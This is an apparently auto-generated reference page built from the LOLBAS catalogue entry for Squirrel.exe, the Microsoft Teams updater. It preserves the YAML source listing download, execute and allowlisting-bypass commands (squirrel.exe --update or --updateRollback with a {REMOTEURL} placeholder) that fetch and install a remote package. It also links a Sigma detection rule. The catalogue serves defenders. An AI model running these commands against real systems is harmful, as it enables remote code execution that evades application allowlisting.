---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Squirrel.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `squirrel.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Squirrel.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Squirrel.exe](../../tools/windows/squirrel.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | squirrel.exe |
| name | Squirrel.exe |
| type | tool |
| source | lolbas |
| url | http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/ |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@reegun21'
  Person: Reegun J (OCBC Bank)
- Handle: '@Hexacorn'
  Person: Adam
Author: Reegun J (OCBC Bank) - @reegun21
Code_Sample:
- Code: https://github.com/jreegun/POC-s/tree/master/nuget-squirrel
Commands:
- Category: Download
  Command: squirrel.exe --download {REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file and download the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Usecase: Download binary
- Category: AWL Bypass
  Command: squirrel.exe --update {REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: Execute
  Command: squirrel.exe --update {REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: AWL Bypass
  Command: squirrel.exe --updateRollback={REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
- Category: Execute
  Command: squirrel.exe --updateRollback={REMOTEURL}
  Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
  MitreID: T1218
  OperatingSystem: Windows 7 and up with Microsoft Teams installed
  Privileges: User
  Tags:
  - Execute: Nuget
  - Execute: Remote
  Usecase: Download and execute binary
Created: 2019-06-26
Description: Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml
Full_Path:
- Path: C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Squirrel.exe
Name: Squirrel.exe
Resources:
- Link: https://www.youtube.com/watch?v=rOP3hnkj7ls
- Link: https://twitter.com/reegun21/status/1144182772623269889
- Link: http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
- Link: https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12
- Link: https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Squirrel.yml
```

## Detection / Analysis Notes

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml
```
